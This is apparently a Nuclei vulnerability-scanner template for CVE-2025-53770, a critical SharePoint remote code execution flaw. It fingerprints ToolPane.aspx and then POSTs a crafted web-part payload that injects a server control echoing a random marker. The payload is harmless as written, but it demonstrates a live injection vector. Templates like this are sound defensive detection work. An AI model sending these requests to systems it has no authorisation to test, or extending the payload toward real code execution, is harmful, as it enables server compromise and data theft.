id: CVE-2025-53770

info:
  name: Microsoft SharePoint Server Remote Code Execution (CVE-2025-53770)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Microsoft SharePoint Server在ToolPane.aspx页面存在代码生成控制不当漏洞，
    攻击者可通过特制的Web部件数据执行远程代码。
    该漏洞可能导致系统完全控制和敏感数据泄露。
  reference:
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-53770
    - https://docs.microsoft.com/en-us/sharepoint/security/security-overview
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: CVE-2025-53770
    cwe-id: CWE-94
  metadata:
    verified: true
    max-request: 2
    vendor: microsoft
    product: sharepoint
    shodan-query: "SharePoint"
  tags: cve,cve2025,sharepoint,rce,microsoft,code-injection

variables:
  payload: "{{rand_base(6)}}"
  signature: "{{to_lower(payload)}}"

http:
  - raw:
      - |
        GET /_layouts/15/ToolPane.aspx?DisplayMode=Edit HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "ToolPane.aspx"
          - "WebPartPages"
        condition: and

      - type: word
        part: body
        words:
          - "SharePoint"
          - "Microsoft SharePoint"
        condition: or

  - raw:
      - |
        POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}/_layouts/15/ToolPane.aspx

        MSOTlPn_Uri=http%3A%2F%2F{{payload}}.com%2F_controltemplates%2F15%2FAclEditor.ascx&MSOTlPn_DWP=%3C%25%40+Register+Tagprefix%3D%22Script%22+Namespace%3D%22System.Web.UI%22+Assembly%3D%22System.Web%22+%25%3E%3CScript%3AScriptManager+ID%3D%22ScriptManager1%22+runat%3D%22server%22%3E%3C%2FScript%3AScriptManager%3E%3Cdiv%3E{{signature}}%3C%2Fdiv%3E

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "{{signature}}"

      - type: word
        part: body
        words:
          - "500"
          - "error"
          - "exception"
        negative: true

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '(?i)SharePoint[_\s-]?([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)'
